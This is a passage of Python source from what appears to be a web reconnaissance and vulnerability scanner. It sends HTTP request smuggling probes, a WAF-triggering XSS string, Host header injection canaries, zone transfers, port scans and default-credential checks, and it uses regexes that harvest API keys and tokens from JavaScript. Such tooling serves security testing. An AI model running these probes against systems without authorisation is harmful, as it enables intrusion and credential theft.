                f"  Technique: {technique}. "
                f"Confirm exploitability with Burp Suite HTTP Request Smuggler "
                f"before reporting."
            )
        )
        print(timestamp() + f" [!] HTTP smuggling signal ({technique}): {host}:{port}")

    # ── CL.TE — front-end honours Content-Length, back-end honours TE ────────
    # Body: "0\r\n\r\nX" = 5 bytes, but CL=6 so front-end forwards all 6;
    # back-end (chunked) reads "0\r\n\r\n" as end-of-body, then "X" is left
    # in the pipeline — the back-end stalls waiting for the next request line.
    cl_te_body = b"0\r\n\r\nX"
    cl_te_raw  = _build({
        "Content-Length":    str(len(cl_te_body) + 1),   # deliberately off by 1
        "Transfer-Encoding": "chunked",
    }, cl_te_body)
    cl_te_resp, cl_te_timeout = _smuggling_raw_send(
        host, port, use_ssl, cl_te_raw, timeout=10)
    cl_te_status = _smuggling_status(cl_te_resp)

    if cl_te_timeout or cl_te_status in (400, 408):
        _flag("CL.TE",
              f"Server at {host}:{port} {'timed out' if cl_te_timeout else f'returned {cl_te_status}'} "
              f"on a request with Content-Length={len(cl_te_body) + 1} and "
              f"Transfer-Encoding: chunked with body '0\\r\\n\\r\\nX' — "
              f"possible CL.TE desync: front-end may use Content-Length while "
              f"back-end uses Transfer-Encoding.  ")

    # ── TE.CL — front-end honours TE, back-end honours Content-Length ────────
    # Valid chunked body: 8-byte chunk "SMUGGLED" then terminator.
    # CL=3 tells a CL-based back-end to read only 3 bytes ("8\r\n"),
    # leaving the remainder in the pipeline.
    te_cl_body = b"8\r\nSMUGGLED\r\n0\r\n\r\n"
    te_cl_raw  = _build({
        "Content-Length":    "3",
        "Transfer-Encoding": "chunked",
    }, te_cl_body)
    te_cl_resp, te_cl_timeout = _smuggling_raw_send(
        host, port, use_ssl, te_cl_raw, timeout=10)
    te_cl_status = _smuggling_status(te_cl_resp)

    if te_cl_timeout or te_cl_status in (400, 408):
        _flag("TE.CL",
              f"Server at {host}:{port} {'timed out' if te_cl_timeout else f'returned {te_cl_status}'} "
              f"on a request with Content-Length=3 and Transfer-Encoding: chunked "
              f"with body '8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n' — "
              f"possible TE.CL desync: front-end may use Transfer-Encoding while "
              f"back-end uses Content-Length.  ")

    # ── TE.TE obfuscation — one layer processes, the other ignores the header ─
    # For each variant, send a well-formed chunked body; if the server times out
    # or errors when it previously responded cleanly to the baseline, the
    # obfuscated header confused one layer.
    _TE_VARIANTS = [
        ("xchunked",          "Transfer-Encoding: xchunked"),
        ("chunked (duplicate)", "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked"),
        ("trailing-space",    "Transfer-Encoding: chunked "),
        ("CHUNKED (caps)",    "Transfer-Encoding: CHUNKED"),
        ("x (invalid)",       "Transfer-Encoding: x"),
    ]
    # A minimal valid chunked body — nothing ambiguous in the body itself.
    te_body = b"0\r\n\r\n"

    for variant_name, raw_te_header in _TE_VARIANTS:
        # Build the raw request manually so we can inject multi-line or
        # malformed TE headers that requests.Session would strip/normalise.
        raw_req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{raw_te_header}\r\n"
            f"Content-Length: {len(te_body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + te_body

        resp_bytes, timed_out = _smuggling_raw_send(
            host, port, use_ssl, raw_req, timeout=10)
        status = _smuggling_status(resp_bytes)

        # Flag only if the result differs meaningfully from the clean baseline:
        # baseline was non-error and this probe timed out or produced 400/408.
        if (timed_out or status in (400, 408)) and baseline_status not in (400, 408):
            _flag(f"TE.TE ({variant_name})",
                  f"Server at {host}:{port} {'timed out' if timed_out else f'returned {status}'} "
                  f"on Transfer-Encoding obfuscation variant '{variant_name}' "
                  f"(baseline status: {baseline_status}) — "
                  f"possible TE.TE desync: the obfuscated header may be processed "
                  f"by one layer and ignored by another.  ")
            break  # one TE.TE signal per host is sufficient


# ─────────────────────────────────────────────
# WAF / security appliance fingerprinting
# ─────────────────────────────────────────────

_waf_checked = set()
_waf_results: dict = {}   # domain → detected vendor string (populated by detect_waf)

# Signature sets: headers, cookie name prefixes, server header fragments, body snippets
WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "cookies": [],
        "server":  ["cloudflare"],
        "body":    ["Attention Required! | Cloudflare", "cf-error-details"],
    },
    "Akamai": {
        "headers": ["x-check-cacheable", "x-akamai-transformed", "x-akamai-request-id"],
        "cookies": [],
        "server":  ["akamaighost", "akamai"],
        "body":    ["Reference&#32;&#35;", "Reference #", "Akamai"],
    },
    "Imperva Incapsula": {
        "headers": ["x-iinfo"],
        "cookies": ["visid_incap_", "incap_ses_"],
        "server":  ["incapsula"],
        "body":    ["Incapsula incident", "_Incapsula_Resource_"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid"],
        "cookies": ["awsalb", "awsalbcors"],
        "server":  [],
        "body":    ["AWS WAF", "Request blocked"],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "cookies": [],
        "server":  ["sucuri/cloudproxy", "sucuri"],
        "body":    ["Sucuri WebSite Firewall", "sucuri-nginxproxy"],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-wa-info"],
        "cookies": ["ts", "f5_cspm", "f5avr", "bigipserver"],
        "server":  ["bigip", "big-ip", "f5 big-ip"],
        "body":    ["The requested URL was rejected", "Please consult with your administrator"],
    },
    "Barracuda": {
        "headers": [],
        "cookies": ["barra_counter_session"],
        "server":  [],
        "body":    ["You have been blocked", "Barracuda Networks"],
    },
    "Wordfence": {
        "headers": [],
        "cookies": [],
        "server":  [],
        "body":    ["generated by Wordfence", "wordfence.com/"],
    },
    "ModSecurity": {
        "headers": ["x-mod-security-message"],
        "cookies": [],
        "server":  [],
        "body":    ["ModSecurity", "mod_security", "This error was generated by Mod_Security"],
    },
    "Fortinet FortiWeb": {
        "headers": [],
        "cookies": ["FORTIWAFSID"],
        "server":  ["fortiweb"],
        "body":    ["FortiWeb", "FortiGate"],
    },
    "Reblaze": {
        "headers": ["x-reblaze-protection"],
        "cookies": ["rbzid"],
        "server":  [],
        "body":    [],
    },
}

def detect_waf(base_url, domain):
    """
    Passive + light-active WAF fingerprinting.

    Pass 1 (passive): inspect headers and cookies from the normal homepage
    response for known WAF signatures.

    Pass 2 (active): send a request with an obviously malicious payload
    (classic XSS string) and inspect the response. WAFs typically return
    403/406/429/503 with a distinctive error page. Compare headers/body
    against signatures.

    Findings are stored in the WAF table and printed as informational context.
    No alert is raised — WAF presence is not a vulnerability, but it's
    critical intelligence for a red teamer (determines viable techniques).
    """
    if domain in _waf_checked:
        return
    _waf_checked.add(domain)

    detected = {}   # vendor → list of evidence strings

    def _check_response(resp, label):
        if not resp:
            return
        header_keys = {k.lower() for k in resp.headers}
        header_vals = " ".join(resp.headers.values()).lower()
        body_snip   = resp.text[:3000].lower() if resp.text else ""
        cookies_str = " ".join(
            c.lower() for c in resp.headers.get("Set-Cookie", "").split(";")
        )
        server = resp.headers.get("Server", "").lower()

        for vendor, sigs in WAF_SIGNATURES.items():
            evidence = []
            for h in sigs["headers"]:
                if h in header_keys:
                    evidence.append(f"header:{h}")
            for c in sigs["cookies"]:
                if c in cookies_str:
                    evidence.append(f"cookie:{c}")
            for s in sigs["server"]:
                if s in server:
                    evidence.append(f"server:{s}")
            for b in sigs["body"]:
                if b.lower() in body_snip:
                    evidence.append(f"body-match")
            if evidence:
                if vendor not in detected:
                    detected[vendor] = []
                detected[vendor].extend([f"{label}:{e}" for e in evidence])

    try:
        # Pass 1 — normal request
        r1 = safe_get(base_url, timeout=8)
        _check_response(r1, "normal")

        # Pass 2 — WAF-triggering request (XSS payload in a query param)
        probe_url = base_url.rstrip("/") + "/?waf_probe=<script>alert(1)</script>"
        r2 = _get_session().get(probe_url, headers=create_request_header(),
                          timeout=6, allow_redirects=True)
        _check_response(r2, "probe")

    except Exception as e:
        print_error(f"WAF detection failed for {domain}: {e}")
        return

    if detected:
        for vendor, evidence in detected.items():
            ev_str = ", ".join(dict.fromkeys(evidence))  # dedup, preserve order
            print(timestamp() + f" WAF detected on {domain}: {vendor} ({ev_str})")
            write_to_waf_database(domain, vendor, ev_str)
            _waf_results[domain] = vendor   # cache for per-page injection checks
    else:
        print(timestamp() + f" No WAF detected on {domain}")

def _response_waf_provider(resp):
    """
    Inspect an HTTP response for WAF fingerprints.
    Returns the WAF provider name string if detected, or None if clean.

    Covers:
      - Akamai:             edgesuite.net in headers or body
      - Incapsula/Imperva:  Incapsula incident or _Incapsula_Resource_ in body,
                            or x-iinfo header
      - Cloudflare:         cf-ray / cf-cache-status header, or
                            "cloudflare" in Server header or body
    """
    if resp is None:
        return None
    header_keys  = {k.lower() for k in resp.headers}
    header_vals  = " ".join(v.lower() for v in resp.headers.values())
    body         = (resp.text or "")[:4000].lower()

    # Akamai
    if "edgesuite.net" in header_vals or "edgesuite.net" in body:
        return "Akamai"

    # Incapsula / Imperva
    if "x-iinfo" in header_keys:
        return "Incapsula/Imperva"
    if "incapsula incident" in body or "_incapsula_resource_" in body:
        return "Incapsula/Imperva"

    # Cloudflare
    if "cf-ray" in header_keys or "cf-cache-status" in header_keys:
        return "Cloudflare"
    server = resp.headers.get("Server", "").lower()
    if "cloudflare" in server or "cloudflare" in body:
        return "Cloudflare"

    return None

def _response_waf_provider_from_text(body_text):
    """
    Same WAF fingerprinting as _response_waf_provider() but works on a plain
    HTML string when no requests.Response object is available (e.g. SSRF page body).
    """
    if not body_text:
        return None
    body = body_text[:4000].lower()
    if "edgesuite.net" in body:
        return "Akamai"
    if "incapsula incident" in body or "_incapsula_resource_" in body:
        return "Incapsula/Imperva"
    if "cloudflare" in body:
        return "Cloudflare"
    return None

def _is_akamai_block(resp):
    """Legacy shim — use _response_waf_provider() for new code."""
    return _response_waf_provider(resp) == "Akamai"

def write_to_waf_database(domain, waf_vendor, detected_by):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WAF")
        existing = conn.execute(
            "SELECT domain FROM WAF WHERE domain=? AND waf_vendor=? LIMIT 1",
            (domain, waf_vendor)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO WAF (domain,waf_vendor,detected_by,found_at) VALUES (?,?,?,?)",
                (domain, waf_vendor, detected_by, timestamp()))
    except Exception as e:
        print_error("write_to_waf_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# /.well-known/ enumeration
# ─────────────────────────────────────────────

_well_known_checked = set()

WELL_KNOWN_PATHS = [
    # Security contact / disclosure policy — OSINT goldmine
    ("/.well-known/security.txt",               "osint"),
    # OpenID Connect discovery — exposes full OAuth/OIDC surface
    ("/.well-known/openid-configuration",        "auth"),
    # OAuth 2.0 authorisation server metadata (RFC 8414)
    ("/.well-known/oauth-authorization-server",  "auth"),
    # JSON Web Key Set — public keys used to verify JWTs
    ("/.well-known/jwks.json",                   "auth"),
    # Password change endpoint hint (RFC 8615)
    ("/.well-known/change-password",             "info"),
    # Apple Universal Links / Android App Links
    ("/.well-known/apple-app-site-association",  "info"),
    ("/.well-known/assetlinks.json",             "info"),
]

def check_well_known(base_url, domain):
    """
    Probe standard /.well-known/ paths.

    security.txt      — OSINT: contact names, PGP keys, disclosure policy URL,
                        bug bounty scope. Confirm with RFC 9116 field names.
    openid-configuration / oauth-authorization-server
                      — Exposes the full OAuth/OIDC surface: token_endpoint,
                        authorization_endpoint, supported grant types, JWKS URI.
                        Alerts HIGH — gives a red teamer the complete auth map.
    jwks.json         — Public keys for JWT verification. Informational.
    Others            — Logged if present; content snippet stored.
    """
    if domain in _well_known_checked:
        return
    _well_known_checked.add(domain)

    for path, category in WELL_KNOWN_PATHS:
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = _get_session().get(url, headers=create_request_header(),
                                timeout=6, allow_redirects=False)
            if not resp or resp.status_code not in (200, 206):
                continue

            body = resp.text
            content_type = resp.headers.get("Content-Type", "").lower()

            # ── security.txt ─────────────────────────────────
            if "security.txt" in path:
                # Confirm it's a real security.txt (RFC 9116 fields)
                if not any(f in body for f in ("Contact:", "Expires:", "Encryption:")):
                    continue
                # Extract key fields for the snippet
                fields = {}
                for line in body.splitlines():
                    for field in ("Contact", "Expires", "Encryption", "Policy", "Acknowledgments", "Preferred-Languages"):
                        if line.startswith(field + ":"):
                            fields[field] = line.split(":", 1)[1].strip()
                snippet = "; ".join(f"{k}: {v}" for k, v in list(fields.items())[:4])
                print(timestamp() + f" security.txt found on {domain}: {snippet}")
                write_to_well_known_database(domain, path, category, snippet[:500])
                continue

            # ── OpenID Connect / OAuth discovery ─────────────
            if category == "auth":
                if "json" not in content_type and "{" not in body[:10]:
                    continue
                try:
                    data = json.loads(body)
                except Exception:
                    continue
                # Extract useful endpoints for the snippet
                keys_of_interest = [
                    "issuer", "authorization_endpoint", "token_endpoint",
                    "userinfo_endpoint", "jwks_uri", "grant_types_supported",
                    "response_types_supported",
                ]
                snippet_parts = []
                for k in keys_of_interest:
                    if k in data:
                        v = data[k]
                        snippet_parts.append(f"{k}: {v if not isinstance(v, list) else ', '.join(v[:3])}")
                snippet = "; ".join(snippet_parts[:5])
                alert(
                    "OPENID/OAUTH DISCOVERY ENDPOINT EXPOSED",
                    "HIGH",
                    domain,
                    f"{url} exposes OAuth/OIDC surface — {snippet[:300]}"
                )
                print(timestamp() + f" [!] OpenID/OAuth config exposed: {url}")
                write_to_well_known_database(domain, path, category, snippet[:500])
                continue

            # ── jwks.json ────────────────────────────────────
            if "jwks" in path:
                if "{" not in body[:10]:
                    continue
                try:
                    data = json.loads(body)
                    key_count = len(data.get("keys", []))
                except Exception:
                    key_count = 0
                snippet = f"JWKS endpoint: {key_count} key(s) exposed"
                print(timestamp() + f" JWKS found on {domain}: {snippet}")
                write_to_well_known_database(domain, path, category, snippet)
                continue

            # ── Everything else ──────────────────────────────
            snippet = body[:300].strip()
            print(timestamp() + f" /.well-known{path.split('well-known')[1]} found on {domain}")
            write_to_well_known_database(domain, path, category, snippet)

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"check_well_known probe failed for {url}: {e}")

def write_to_well_known_database(domain, path, category, content_snippet):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WellKnown")
        existing = conn.execute(
            "SELECT domain FROM WellKnown WHERE domain=? AND path=? LIMIT 1",
            (domain, path)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO WellKnown (domain,path,category,content_snippet,found_at) VALUES (?,?,?,?,?)",
                (domain, path, category, content_snippet, timestamp()))
    except Exception as e:
        print_error("write_to_well_known_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Host header injection detection
# ─────────────────────────────────────────────

_host_header_checked = set()

def check_host_header_injection(base_url, domain):
    """
    Test for Host header injection by sending requests with a unique canary
    value in Host, X-Forwarded-Host, X-Host, and X-Forwarded-Server headers.

    A vulnerable server will reflect the injected host into:
      - Response body (links, form actions, meta refresh, canonical URLs)
      - Location header (redirect destination)
      - Any other response header (Content-Location, Link, etc.)

    This is commonly exploited to poison password-reset links, cache entries,
    and internal service routing. Alerts HIGH on confirmed reflection.
    """
    if domain in _host_header_checked:
        return
    _host_header_checked.add(domain)

    import uuid as _uuid
    canary = f"hhiprobe-{_uuid.uuid4().hex[:12]}.example.com"

    # Headers to test — each pass injects one header at a time so we know
    # which header the server is trusting.
    injection_headers = [
        ("X-Forwarded-Host",   canary),
        ("X-Host",             canary),
        ("X-Forwarded-Server", canary),
        ("X-Original-Host",    canary),
    ]

    base_headers = create_request_header()

    for header_name, header_value in injection_headers:
        test_headers = {**base_headers, header_name: header_value}
        try:
            stealth_delay(domain)
            resp = _get_session().get(
                base_url,
                headers=test_headers,
                timeout=8,
                allow_redirects=False,
            )
        except Exception as e:
            print_error(f"Host header injection probe failed ({header_name}) for {domain}: {e}")
            continue

        reflected_in = []

        # Check response body
        body = resp.text[:50000]
        if canary in body:
            reflected_in.append("response body")

        # Check all response headers
        for h_name, h_val in resp.headers.items():
            if canary in h_val:
                reflected_in.append(f"response header {h_name}")

        if reflected_in:
            where = ", ".join(reflected_in)
            alert(
                "HOST HEADER INJECTION",
                "HIGH",
                base_url,
                f"Server reflects injected '{header_name}: {canary}' in {where}. "
                f"Exploitable for password-reset poisoning, cache poisoning, SSRF."
            )
            print(timestamp() + f" [!!] Host header injection via {header_name} on {domain}")
            return   # One confirmed finding per domain is enough


# ─────────────────────────────────────────────
# Domain enrichment
# ─────────────────────────────────────────────

def base_url_for(domain_or_url):
    """Return scheme://host for a domain or full URL."""
    parsed = urlparse(domain_or_url)
    if parsed.scheme:
        return parsed.scheme + "://" + parsed.netloc
    return "https://" + domain_or_url

def enrich_domain(domain_name, response_headers=None, html_content=None):
    clean_domain = sanitize_url(str(domain_name))
    try:
        resp = safe_get(domain_name, method="head")
        if resp:
            record_http_response(domain_name, resp.status_code)
            server       = resp.headers.get('Server', 'Unknown')
            content_type = resp.headers.get('Content-Type', 'Unknown')
            # Security header analysis on every new domain
            analyze_security_headers(clean_domain, dict(resp.headers))
        else:
            server = content_type = 'Unknown'

        rate_limit()
        title = grab_title(domain_name)
        rate_limit()

        try:
            ip = socket.gethostbyname(clean_domain)
        except socket.gaierror:
            ip = 'Unknown'

        # ASN lookup — identifies CDNs, hosting providers, and org ownership
        asn_info = asn_lookup(ip)

        # Fingerprint technologies from headers + HTML (HTML optional).
        # Always call so header-only signals (X-Powered-By, cookies) are caught
        # even when the crawl loop doesn't provide html_content.
        _fp_headers = response_headers or (dict(resp.headers) if resp else {})
        detected_techs = fingerprint_technologies(
            domain_name, _fp_headers, html_content or "")

        # ── Parallel I/O: DNS, SSL, WHOIS, port scan ─────────────
        from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _ac
        _network_tasks = [
            dns_lookup,
            mx_lookup,
            attempt_zone_transfer,
            get_ssl_info,
            get_whois_info,
            port_scan,
            check_tls_config,
        ]
        with _TPE(max_workers=len(_network_tasks)) as _ex:
            _futs = {_ex.submit(fn, clean_domain): fn for fn in _network_tasks}
            for _f in _ac(_futs):
                pass

        # ── Parallel subdomain discovery ──────────────────────────
        with _TPE(max_workers=2) as _ex:
            _futs = [
                _ex.submit(enumerate_subdomains, clean_domain),
                _ex.submit(query_ct_logs, clean_domain),
            ]
            for _f in _ac(_futs):
                pass

        # ── Exposure checks — parallel, once per base URL ─────────
        base = base_url_for(domain_name)
        if base not in _exposure_checked:
            _exposure_checked.add(base)
            _exposure_tasks = [
                (check_git_exposure,           (base, clean_domain)),
                (check_env_exposure,           (base, clean_domain)),
                (check_directory_listing,      (base, clean_domain)),
                (check_backup_exposure,        (base, clean_domain)),
                (check_actuator_exposure,      (base, clean_domain)),
                (check_sensitive_files,        (base, clean_domain)),
                (detect_waf,                        (base, clean_domain)),
                (check_well_known,                  (base, clean_domain)),
                (check_host_header_injection,       (base, clean_domain)),
                (check_admin_panels,                (base, clean_domain)),
                (check_security_headers,            (base, clean_domain)),
            ]
            # Technology-specific checks — run when fingerprinting detected a known stack
            if detected_techs:
                _exposure_tasks.append(
                    (check_technology_specific, (base, clean_domain, detected_techs))
                )
            # Active probe checks — only run when --active-probes is enabled
            if ACTIVE_PROBES:
                _exposure_tasks += [
                    (check_graphql_introspection,    (base, clean_domain)),
                    (check_cors_misconfiguration,    (base, clean_domain)),
                    (check_default_credentials,      (base, clean_domain)),
                    (check_dangerous_http_methods,   (base, clean_domain)),
                    (check_http_smuggling,           (base, clean_domain)),
                ]
            with _TPE(max_workers=8) as _ex:
                _futs = {_ex.submit(fn, *args): fn for fn, args in _exposure_tasks}
                for _f in _ac(_futs):
                    pass

        # SPF/DMARC — DNS-based, run once per root domain
        check_spf_dmarc(clean_domain)

        # S3 permutation scan — guesses common bucket names from the root domain
        probe_s3_permutations(clean_domain)

        write_to_domain_database(str(domain_name), ip, server, content_type, title)

    except Exception as err:
        print_error("enrich_domain failed for " + domain_name + ": " + str(err))



# ─────────────────────────────────────────────
# JS bundle analysis
# ─────────────────────────────────────────────

# Track which JS files have already been analysed this session
_js_analysed = set()

# Patterns for extracting findings from JS bundles
JS_ENDPOINT_PATTERNS = [
    r"""[\"'`](/(?:api|v\d|graphql|rest|internal|admin|backend)[^\s\"'`<>{}\[\]]{2,100})""",
    r"""[\"'`](https?://[a-zA-Z0-9._/-]+/(?:api|v\d|graphql)[^\s\"'`<>{}\[\]]{0,100})""",
    r"""(?:url|endpoint|path|route|baseURL|apiUrl)\s*[:=]\s*[\"'`](/[^\s\"'`<>]{2,80})""",
]

# Domains whose endpoints are always public/noise — mapping tiles, CDNs,
# analytics, fonts, etc. Endpoints from these hosts are never worth storing.
ENDPOINT_NOISE_DOMAINS = {
    # Mapping / GIS
    "arcgisonline.com", "arcgis.com", "js.arcgis.com",
    "maps.googleapis.com", "maps.google.com",
    "api.mapbox.com", "events.mapbox.com",
    "tile.openstreetmap.org", "nominatim.openstreetmap.org",
    # Google services
    "googleapis.com", "googletagmanager.com", "google-analytics.com",
    "googleadservices.com", "googlesyndication.com", "google.com",
    "gstatic.com", "fonts.gstatic.com", "fonts.googleapis.com",
    # Meta / social tracking
    "facebook.com", "connect.facebook.net", "graph.facebook.com",
    "platform.twitter.com", "syndication.twitter.com",
    # CDNs and asset hosts
    "cloudflare.com", "cloudfront.net", "fastly.net",
    "cdn.jsdelivr.net", "cdnjs.cloudflare.com",
    "unpkg.com", "jsdelivr.net",
    # Analytics / monitoring
    "segment.io", "segment.com", "amplitude.com",
    "hotjar.com", "fullstory.com", "logrocket.com",
    "newrelic.com", "nr-data.net", "sentry.io",
    "datadog-browser-agent.com", "datadoghq.com",
    # Marketing / CRM
    "hubspot.com", "hubapi.com", "hs-scripts.com",
    "intercom.io", "intercomcdn.com",
    "marketo.net", "salesforce.com",
    # Payments (client-side SDKs only)
    "js.stripe.com", "checkout.stripe.com",
    # Auth SDKs
    "auth0.com", "cdn.auth0.com",
    "accounts.google.com", "appleid.apple.com",
}

def is_endpoint_noise(endpoint_str):
    """Return True if the endpoint belongs to a known public/noise domain."""
    try:
        parsed = urlparse(endpoint_str if endpoint_str.startswith("http")
                          else "https:" + endpoint_str)
        netloc = parsed.netloc.lower().lstrip("www.")
        for noise_domain in ENDPOINT_NOISE_DOMAINS:
            if netloc == noise_domain or netloc.endswith("." + noise_domain):
                return True
    except Exception:
        pass
    return False

JS_SECRET_PATTERNS = [
    (r'''(?i)(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "api_key"),
    (r'''(?i)(?:secret[_-]?key|secret)\s*[:=]\s*["']([A-Za-z0-9_\-/+]{16,64})["']''', "secret"),
    (r'''(?i)(?:access[_-]?token|auth[_-]?token)\s*[:=]\s*["']([A-Za-z0-9_\-\.]{16,200})["']''', "token"),
    (r'''(?i)(?:password|passwd)\s*[:=]\s*["']([^"'\s\-][^"'\s]{7,63})["']''', "password"),
    (r'AKIA[0-9A-Z]{16}', "aws_access_key"),
    (r'''(?i)(?:private[_-]?key)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "private_key"),
    (r'''(?i)(?:client[_-]?secret)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "client_secret"),
    (r'ghp_[A-Za-z0-9]{36}', "github_token"),
    (r'sk-[A-Za-z0-9]{48}', "openai_key"),
    (r'sk\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', "mapbox_secret_token"),
    (r'pk\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', "mapbox_public_token"),
]

JS_STAGING_PATTERNS = [
    r"""[\"'`](https?://(?:dev|staging|stage|uat|test|qa|internal|corp|beta|alpha)\.[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[^\s\"'`<>]{0,100})""",
    r"""[\"'`](https?://[a-zA-Z0-9._-]+\.(?:internal|local|corp|dev|staging)[^\s\"'`<>]{0,100})""",
]

# False positive filters for secrets
SECRET_FP_PATTERNS = [
    "example", "placeholder", "your_", "YOUR_", "xxx", "test", "dummy",
    "xxxxxxxx", "00000000", "11111111", "abcdefgh", "REPLACE", "changeme",
    # UI string keys — kebab/snake-case identifiers from i18n and component systems
    "invalid-", "input-", "error-", "label-", "button-", "create-",
    "edit-", "update-", "delete-", "set-new-", "confirm-", "reset-",
    "forgot-", "enter-", "account-", "validation", "-password", "-token",
    "-create", "-update", "-error", "-invalid", "-required", "-verify",
    "-gauth", "-one-time", "new-password", "old-password", "current-password",
]

def is_secret_fp(val):
    return any(fp in val.lower() for fp in SECRET_FP_PATTERNS)

# Known public/client-side key prefixes — intentionally shipped in
# frontend code and carry no server-side privilege
PUBLIC_KEY_PREFIXES = [
    "AIza",       # Google public API keys (Maps, YouTube, etc.)
    "pk_live_",   # Stripe publishable live key
    "pk_test_",   # Stripe publishable test key
    "G-",         # Google Analytics GA4 measurement ID
    "UA-",        # Google Analytics Universal Analytics
    "GTM-",       # Google Tag Manager
    "ca-pub-",    # Google AdSense
    "APA91",      # Firebase Cloud Messaging sender ID
    "1:",         # Firebase project number prefix
]

# Mapbox public tokens (pk.eyJ…) are intentionally shipped in frontend code.
# Only sk.eyJ… are secret tokens.
_mapbox_pk_seen: set = set()

def is_public_key(val):
    """Return True if the value matches a known public/client-side key format."""
    if val.startswith("pk.eyJ"):
        return True  # Mapbox public token — intentionally client-side
    return any(val.startswith(p) for p in PUBLIC_KEY_PREFIXES)

def is_identifier_string(val):
    """
    Return True if the value looks like a code identifier rather than
    a real credential. Real passwords have mixed chars, symbols, entropy.
    Identifiers are snake_case, SCREAMING_SNAKE, camelCase, or PascalCase
    containing only word characters.
    """
    # URL path — starts with / and contains no spaces or special credential chars
    if val.startswith('/'):
        return True
    # Pure word characters + underscores = almost certainly an identifier
    if re.fullmatch(r'[A-Za-z0-9_]+', val):
        return True
    # Double underscores = namespaced i18n key (e.g. login__incorrect_password)
    if '__' in val:
        return True
    # UUID — consent management IDs, tracking IDs, etc.
    if re.fullmatch(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', val.lower()):
        return True
    # HTML attribute selector — e.g. [type=password], [name=passwd]
    if val.startswith('[') and val.endswith(']'):
        return True
    # JS expression fragment — contains operators or function calls
    if re.search(r'[+\(\)\[\]{}]', val):
        return True
    # No digits and no common password complexity chars → human-readable label,
    # not a credential. Catches i18n/l10n strings like "Contraseña", "Mot de passe",
    # garbled encodings thereof, error messages, and UI copy embedded in password
    # fields (e.g. password:"Usuario o contraseña inválidos").
    if not re.search(r'[\d!@#$%^&*+=]', val):
        return True
    return False

# ─────────────────────────────────────────────
# Alert system — exploitable vulnerability detection
# ─────────────────────────────────────────────

HIGH_SEVERITY_TYPES = {
    "aws_access_key", "github_token", "openai_key",
    "api_key", "secret", "token", "password",
    "private_key", "client_secret",
}

# Ports that, if open to the internet, represent direct exploitation risk
CRITICAL_PORTS = {
    5432:  "PostgreSQL",
    6379:  "Redis (unauthenticated by default)",
    27017: "MongoDB (unauthenticated by default)",
    23:    "Telnet (unencrypted)",
}

# Ports that are common and not inherently dangerous — logged but not alerted
INFORMATIONAL_PORTS = {
    21:   "FTP",
    22:   "SSH",
    3306: "MySQL",
}

# Tracks FQDNs already alerted to prevent duplicate alerts from the
# wordlist prober and the CT log path discovering the same subdomain.
_alerted_subdomains: set = set()

def _alert_high_value_subdomain(fqdn, label, ip, status, source=""):
    """
    Fire a HIGH-VALUE SUBDOMAIN EXPOSED alert, but only once per FQDN.
    Performs the secondary content fetch to confirm a real service is
    listening before alerting. Suppresses if the body is under 100 chars
    or the connection times out.
    """
    if fqdn in _alerted_subdomains:
        return
    scheme = "https://" if (status and status < 400) else "http://"
    source_note = f" (discovered via {source})" if source else ""
    try:
        content_resp = _get_session().get(
            scheme + fqdn,
            headers=create_request_header(),
            timeout=6,
            allow_redirects=True,
            verify=False,
        )
        if len(content_resp.text) < 100:
            print(timestamp() + f" {fqdn} body too short ({len(content_resp.text)} chars) — suppressing high-value subdomain alert")
            return
    except requests.exceptions.Timeout:
        print(timestamp() + f" {fqdn} timed out on content fetch — suppressing high-value subdomain alert (DNS resolves, no service confirmed)")
        return
    except Exception:
        pass  # network error — alert conservatively

    _alerted_subdomains.add(fqdn)
    alert(
        f"HIGH-VALUE SUBDOMAIN EXPOSED: {label}",
        "HIGH",
        fqdn,
        f"{fqdn} resolves to {ip} and returns HTTP {status}{source_note}"
    )

# Subdomains that are high-value targets when exposed
HIGH_VALUE_SUBDOMAINS = {
    "admin", "administrator", "portal", "dashboard", "cpanel", "whm",
    "jenkins", "ci", "build", "deploy", "gitlab", "bitbucket",
    "jira", "confluence", "staging", "stage", "dev", "uat",
    "vpn", "remote", "rdp", "ssh", "db", "database", "redis", "mongo",
    "internal", "corp", "backup",
}

# EOL PHP major versions — known vulnerable
EOL_PHP_VERSIONS = {"5", "4", "3"}

# Social media domains to skip when --no-social is active.
# Add entries here to extend the list.
SOCIAL_MEDIA_DOMAINS = {
    # Meta
    "facebook.com", "fb.com", "instagram.com", "threads.net", "messenger.com",
    # Google
    "youtube.com", "youtu.be",
    # Twitter / X
    "twitter.com", "x.com", "t.co",
    # Microsoft
    "linkedin.com", "lnkd.in",
    # TikTok
    "tiktok.com", "vm.tiktok.com",
    # Snapchat
    "snapchat.com",
    # Pinterest
    "pinterest.com", "pin.it",
    # Reddit
    "reddit.com", "redd.it",
    # Tumblr
    "tumblr.com",
    # Discord
    "discord.com", "discord.gg", "discordapp.com",
    # Telegram
    "telegram.org", "t.me",
    # WhatsApp
